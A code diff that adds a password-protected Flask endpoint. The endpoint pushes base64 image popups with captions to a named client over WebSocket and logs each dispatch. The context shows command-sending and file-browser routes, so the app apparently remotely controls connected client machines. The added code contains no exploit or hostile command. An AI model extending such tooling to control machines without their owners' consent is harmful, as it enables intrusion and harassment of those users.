@@ -613,6 +613,30 @@ def set_command():
     return jsonify({"status": "success", "message": "Command sent over WebSocket"})
 
 
+@app.post("/api/image")
+@require_password
+def send_image():
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    image_b64 = data.get("image")
+    caption = (data.get("caption") or "").strip()
+
+    if not username or not is_safe_name(username):
+        return jsonify({"status": "error", "message": "Missing or invalid username"}), 400
+
+    if not image_b64:
+        return jsonify({"status": "error", "message": "Missing image data"}), 400
+
+    # Push to client room via WebSocket
+    socketio.emit("display_image", {"image": image_b64, "caption": caption}, room=username)
+
+    # Log operation in database
+    detail = f"Image popup sent: {caption}" if caption else "Dispatched image popup to client"
+    log_operation(username, "IMAGER", detail, "dispatched")
+
+    return jsonify({"status": "success", "message": "Image sent over WebSocket"})
+
+
 # ── File System / FTP Browser Routes ──
 
 
